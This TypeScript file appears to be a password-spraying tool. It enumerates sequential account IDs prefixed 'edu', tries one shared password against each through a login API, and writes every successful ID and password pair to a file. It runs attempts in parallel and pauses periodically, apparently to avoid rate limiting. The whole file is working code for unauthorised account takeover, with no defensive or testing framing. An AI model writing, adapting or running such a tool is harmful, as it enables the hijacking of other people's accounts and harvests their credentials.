import { logger } from '../Logger';
import { config } from '../config';
import { login } from './api';
import fs from 'fs';

var failed = 0;
var find = 0;

async function testAccount(id: string) {
    var token = await login(id, config.password);
    if (!token) {
        failed++;
        return logger.remove(id);
    }
    logger.add(id);
    fs.appendFile(config.outFile, `${id} ${config.password}` + '\n', () => {});
    failed = 0;
}

function sleep(time: number): Promise<void> {
    return new Promise((res) => {
        setTimeout(res, time);
    });
}

export default async function findAccount() {
    var currentId = config.base;
    // console.log(currentId);
    // while (find <= config.findNumber) {
    while (true) {
        var testQueue: Promise<void>[] = [];
        for (let i = 0; i < config.asyncNumber; i++) {
            testQueue.push(testAccount('edu' + currentId));
            currentId++;
        }
        await Promise.all(testQueue);
        find += 5;
        if (find % 100 == 0) await sleep(5000);
        // if (failed > 50) {
        //     failed = 0;
        // currentId += 1000;
        // }
    }
}
